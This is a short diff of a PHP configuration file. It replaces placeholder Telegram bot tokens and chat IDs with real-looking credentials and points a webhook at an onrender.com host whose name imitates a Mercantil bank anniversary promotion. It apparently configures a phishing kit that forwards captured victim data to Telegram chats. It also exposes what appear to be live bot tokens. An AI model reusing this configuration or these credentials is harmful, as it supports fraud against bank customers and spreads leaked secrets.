@@ -14,16 +14,16 @@ if (basename($_SERVER['PHP_SELF']) === basename(__FILE__)) {
 $telegram_accounts = [
 
     [
-        'token' => 'TOKEN_BOT_1',
-        'chat_id' => '-1003964372304'
+        'token' => '8333175930:AAH8zK1h6bjK-A5TiKd63C5EFAhGlD_WZO0',
+        'chat_id' => '-5228173748'
     ],
 
     [
-        'token' => 'TOKEN_BOT_2',
-        'chat_id' => '-1001234567890'
+        'token' => '8230345120:AAEvBhKizuAYGZxs2wwKX7tf9ubFr6S1ueA',
+        'chat_id' => '8715543743'
     ]
 
 ];
 
-$webhook_url = 'https://promocionesmercantil.onrender.com/approve.php';
+$webhook_url = 'https://mercantil100anos.onrender.com/approve.php';
 ?>
